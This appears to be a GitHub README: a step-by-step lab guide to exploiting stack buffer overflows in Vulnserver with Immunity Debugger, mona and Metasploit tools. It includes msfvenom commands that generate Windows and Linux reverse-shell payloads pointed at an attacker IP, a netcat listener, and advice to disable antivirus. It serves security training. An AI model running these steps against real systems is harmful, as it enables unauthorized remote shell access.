![image](https://github.com/planetxort/Buffer-Overflow-Guide/blob/master/buff.png)
Created By: John Jackson (Twitter:@johnjhacking)

**Special thanks to the Contributors:**

mateuszz0000 - Revisions to the Python Scripts
# Buffer Overflow Guide
Bufferflow Guide, inspired by TheCyberMentor's Buffer Overflow tutorial: [Buffer Overflows Made Easy](https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G) 

# Background:
This repository is supplemental information based on TheCyberMentor's walkthrough. I created this guide with the intent to provide step-by-step written instructions, and hopefully provide greater insight or additional confidence in your pursuit to learn this technique. I believe that notetaking can be difficult for many individuals, therefore the goal of this repository is to consolidate steps into a reference sheet and provide the scripts used in TheCyberMentor's video series. 

All credit for the scripts goes to TheCyberMentor. The only changes I made to the scripts were morale-building naming conventions and providing an additional methodology for Linux Buffer Overflows. The beauty of this repository is that you can clone it to your Linux machine (removing the need for manually typing out python scripts) and utilize it as a reference if you forget any of the steps in TheCyberMentor's Walkthrough (or cloned before watching his video series)

# Before Starting:
1. Please use the scripts in the **Command-Req** folder if the service you're attempting to exploit allows you to input commands such as STAT, TRUN, etc.
2. Please use the scripts in the **Input Reflection** folder if it is determined that there are no commands you can Spike. This will be determined in Step 1 of the guide.
3. Naming mechanism of the scripts will remain consistent to prevent confusion in the guide. You will perform near-identical steps. Check out the README in Reflection Input for specific instructions for Commandless services.


# Assumed Knowledge
1. Lab Setup
2. An understanding of Network adapters and communication between Windows/Linux
3. Basic knowledge of Metasploit, Python, and Shells
4. You have watched TheCyberMentor's Video Series, or you have a baseline level of buffer overflow understanding
5. Enumeration Methodology (Linux and Windows)
6. Immunity Debugger

# Tools needed:
1. Kali Linux
2. Windows System with Immunity Debugger installed, *NOTE*: You do **not** have to put in real information to download this. ([Immunity Debugger](https://debugger.immunityinc.com/ID_register.py))
3. Vulnserver: [Download Link](https://sites.google.com/site/lupingreycorner/vulnserver.zip?attredirects=0) (if you're following along with TheCyberMentor's video series)

# Additional Setup Considerations
1. Ensure you have permission to run executable files as Administrator on Windows.
2. Download or Copy the code of [Mona.py](https://github.com/corelan/mona/blob/master/mona.py); you will need this for module functionality in Immunity Debugger.
3. Place the Mona.py file in the following directory: C:/Program Files(x86)/Immunity Inc/Immunity Debugger/PyCommands
4. Ensure you have connectivity between your Lab Environment (do a ping from your Linux host to your windows host) ping x.x.x.x - If you don't, please read guides on understanding Network Adapter Settings for your specific virtualization software.
5. If you're exploiting Linux, please read the "Linux Considerations" section before attempting to start on any of these steps.
6. Turn off Windows Defender or other Antivirus solutions. If you don't, you may have issues with Vulnserver. If you're testing against a different vulnerable machine, I still recommend doing the same to avoid any problems with Defender killing your shell.

# Table of Contents
1. Identification
2. Spiking
3. Fuzzing
4. Finding the Offset
5. Overwriting the EIP
6. Finding Bad Characters
7. Finding the Correct Module
8. Exploiting the System

# 1. Identification
The typical Buffer Overflow scenario relies on Reverse Engineering an executable file. Before you attempt to Spike, you're going to want to find an executable file. In the instance of Vulnserver, you will download the file. In a realistic scenario, you're going to want to perform enumeration methodology and look for an executable file to download. These are hosted via SMB Shares, FTP Servers, Exposed Web Directories, etc. Use best practice regarding enumeration and continue with this guide when you have an executable file.

# 2. Spiking
Spiking is all about identifying what command is vulnerable (observed by the program breaking in Immunity)

Steps:
1. Connect to a port or a program that allows you to send specific commands, for instance; you may see that the system you're trying to exploit has a service on port 9999.
**Command: nc -nv 9999**
2. Observe the commands that you can use on the service, in TheCyberMentor video, the vulnerable service command was "TRUN," but in reality, you will likely have to use the provided script on multiple commands until the program breaks. If you do **NOT** see any commands to test, proceed to the FAQ at the end of this README.md file.
3. Run Immunity as Admin.
4. Run the executable you found. (or downloaded for practice)
5. Attach to the executable process.
6. Click the "Play" button in Immunity, ensure it says Running on the bottom right-hand corner.
7. Use the provided command.spk file, ensuring that you edit the 'STATS' command with whatever command you're attempting to test.
**Command: generic_send_tcp IP port command.spk 0 0**
8. After you utilize the command.spk, look to see if there's an Access Violation in Immunity, if there is not, edit the command within the command.spk to a different one and retest.

# 3. Fuzzing
The process of Fuzzing is to attempt to identify the number of bytes it took to crash the program.

1. Edit the provided fuzz.py script. Replace the IP, PORT, and TRUN command with the IP, port, and command you want to test.
2. Restart Immunity + the Exe and attach as you did previously.
3. Run the script
**Command: python fuzz.py**
4. Try to use CTRL+C to stop the script exactly when you see an Access Violation pop-up in Immunity. Doing so will ensure you can more accurately estimate the bytes it took to crash it.
5. Write down the number of bytes it took to crash the program.

# 4. Finding the Offset
The correct identification of the offset will help ensure that the Shellcode you generate will not immediately crash the program.

1. Generate pattern code, replacing the number in the command with the number of bytes it took to crash the program (found in step 3)
**Command: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000**
2. Copy the output of the pattern_create command and edit the offset.py script provided in this repository. Replace the existing offset value portion of the script with the pattern that you generated from the command. Replace the IP, Port, and Command as you did in the previous testing sections.
3. Closeout Immunity + the executable program.
4. Repeat the process of relaunching Immunity and attaching to the executable program.
5. Run the script
**Command: python offset.py**
6. Go into Immunity and look for a number written in the EIP space.
7. If there is no number written into the EIP space, the number of bytes you identified in your Fuzz may be off. Go back to step 1 and regenerate pattern code, using a number higher than whatever you had written to the script. For instance, if you used 700, try 1000, or 1200. If you are unsuccessful, you may have messed up during Fuzzing. Go back to the Fuzzing section and try to stop the script faster when you see the Access Violation in Immunity.
8. When you find a number written to the EIP, write this number down somewhere. Use the following command, replacing the -l switch value with your identified fuzz-bytes number from step 1, and replace the -q switch with the number that is written to the EIP.
**Command: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337**
9. If everything is correct, when you run the above command, you should get an exact offset match that looks like this:
 **[*] Exact match at offset 2003**
10. Ensure that you write down this offset match.

# 5. Overwriting the EIP
This step will help you ensure that you can control the EIP. If you are successful, you will observe 4 "B" characters within the EIP space (Based off of the script code)
1. Restart Immunity + the Exe and attach as you did previously. 
2. Edit the provided python script to test your offset (shelling-out.py)
3. Replace "2003" with your offset value found in step 9 of the Offset section, replace the IP, port, and command with your values as you did in previous sections.
4. Run the script
**Command: python shelling-out.py**
5. You should now observe 4 "B characters" represented by 42424242 written to the EIP.
6. You now control the EIP.

# 6. Finding Bad Characters
The focus of this section is identifying bad characters so you can ensure they do **not** get included in your Shellcode.
1. The original script is now modified to use Georgia Weidman's bad character cheat sheet.
2. Null bytes x00 are automatically considered bad because of issues they tend to cause during Buffer Overflows, make sure that you note that as your first bad character.
3. Edit the provided badcharizard.py script, copy the Bad Characters section into a notepad, or somewhere that you can compare them against the Immunity Console. Ensure that you change the IP, Port, and Command within the script with your values.
4. Relaunch Immunity and the executable, attaching to the program as you did in previous steps.
5. Run the script
**Command: python badcharizard.py**
6. Go to Immunity, right-click on the ESP value, and click on "Follow in Dump."
7. Right-click on the Hex Dump tab and click "Appearance -> Font -> OEM" this will make the values a little bigger for comparison.
8. In the Hex Dump, 01 represents the first bad character tested while FF represents the last. The bad characters go in order, compare the Hex Dump with the characters you copied into Notepad.
9. For example, the first line of the Hex Dump could read 01 02 03 04 05, if you see a skip within this order, the character it skips is a **bad character**. For example, imagine the first line of the Hex Dump read 01 02 03 B0 05, you would now know that 04 is a bad character because it was skipped. You would now annotate x04 as a bad character for later. You have to evaluate all the lines until you hit your first FF. It's a true "eye test," as TheCyberMentor says.
10. Double-check for bad characters, and then triple check, and then quadruple check. If you do not have the correct list of bad characters to avoid using in your Shellcode, it will fail.

# 7. Finding the Correct Module
It's time to find what pointer you need to use to direct the program to your Shellcode for the Buffer Overflow
1. Relaunch your Immunity and your program, reattach. This time, do not press the "play" button.
2. Go into Immunity, and in the white space underneath the "terminals" type: **!mona modules**
3. You will see a bunch of information come up; you are concerned with the Module Info section. You are looking for a module that has all "False" values, preferably a dll, but it could be the actual exe you're attached to depending on the box you're attempting to exploit.
4. Write down this module, for example, essfunc.dll
5. You are now going to identify the JMP ESP, which is crucial because it represents the pointer value and will be essential for using your Shellcode.
6. JMP ESP converted to hex is FFE4, that's what you're looking for.
7. Return to that command box you used for mona modules, this time type: **!mona find -s "\xff\xe4" -m essfunc.dll**
8. The -m switch represents the module that you're trying to find the JMP ESP for, ensure that you swap out essfunc.dll with whatever the module value you wrote down in step 4.
9. When you use the command, you will get a column of results that look like this:
0x625011af
0x625011bb
0x625011c7
0x625011d3
0x625011df
0x625011eb
0x625011f7
0x62501203
0x62501205
10. Write down any of the column results that are mostly all "false." You will have to test these. In the instance of vulnserver, the result that will work is 625011af, but if you didn't know that, you might have to perform the next steps on multiple of these false column results.
11. Edit the included jumpboyz.py script, edit the shellcode string with the reversed version of one of the results you got from step 10, for example: "\xaf\x11\x50\x62" represents 625011af. Ensure you edit the IP, port, and command of the script.
12. Go back to Immunity's CPU window, click the black arrow, and type in the pointer tested to follow the expression (for instance: 625011af)
13. Click the pointer in the window in the top left-hand corner, click F2, you should see the value highlighted with a color. The objective is to set a break-point for testing.
14. Now, you can click the "Play" button and observe "Running" in the bottom corner of Immunity.
15. Run the python script
**Command: python jumpboyz.py**
16. If you see the pointer value written to the EIP, you can now generate Shellcode. If you don't see it, repeat the process with other column pointer values you identified as false from Step 9.

# 8. Exploiting the System
The last step in this process, generating Shellcode and ensuring that we can exploit the system.
1. Restart Immunity/your exe program and get setup.
2. Generate the Payload: 
Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.82 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
3. Replace the LHOST with your Kali Machine IP and replace the -b switch with the bad characters that you had identified earlier. In this instance, there's only one bad character represented by "\x00"
4. Edit the included gotem.py script. Ensure that your exploitation IP and Port and command values are correct. Take your generated Shellcode and replace the overflow value that is currently in the script.
5. Ensure that all variables are correct, including your exact byte value, pointer value, etc. 
6. Start your netcat listener:
**Command: nc -lvp 4444**
7. Run the script:
**Command: python gotem.py**
8. If the shell doesn't catch, try to change the padding value in the script from 32 to 16 or 8. It may take some trial and error.
9. You should now have a shell, congratulations.

# Linux Considerations
So you're a cool cat, huh? Going after Linux? That's fine! Let me share some minor differences with you so that you do not go crazy.

1. If you don't want to use a Linux Debugging program, that's fine; you can use Immunity, but please let me explain.
2. If you're attacking a Linux machine, copy the EXE that you find over to your Windows host.
3. Perform testing with the same methodology defined above, with a few differences: Use your Windows IP address within all of the scripts. The testing process isn't going to work with the Linux Machine's IP address.You will have to generate Linux Shellcode.
4. Once you have shelled your Windows system, it's time to make some quick changes to shell the Linux system.
5. Generate Linux Shellcode:
**Command: msfvenom -p linux/x86/shell_reverse_tcp lhost=10.2.12.189 lport=4444 -f python -b '\x00'**
6. Replace the localhost with your Kali Machine and the bad characters that come after the -b switch
7. Edit your gotem.py script, replace the IP and Port with the Linux Machine IP and port, and edit the command that you tested against with the vulnerable command.
8. Delete the entire overflow section, paste the payload that you generate into this section.
9. change the overflow variable in the shellcode, it should be **buf** instead
10. Save the script! 
11. Run the script:
**Command: python gotem.py**

YOU ARE A MASTER

# FAQ
1. What if the port that I connect to doesn't have any commands?
First attempt to enumerate commands. On Linux, run the command: strings foo.exe
This should give you a list of commands the Exe uses, if not, it's possible that the text
that you enter is the "vulnerability" and you'll have to modify your scripts accordingly. 
Proceed to the Reflection Input folder in this repository, read the "Readme" & use those scripts instead.

2. What if everything has worked, but I cannot catch a shell?
Review and evaluate: Are you using the correct payload type (Linux vs. Windows?) Are the IP, Port and Commands correct? Did you reverse the pointer correctly in the final script? Did you change the padding from 32 to 16 or 8? Do you have a listener setup? On the correct port? Did you try a listener on a different port? There are a ton of questions you can ask but these are baseline troubleshooting questions.

These are the only two questions i've thought of. Please contact me with any additional questions.
Thank you for reading!
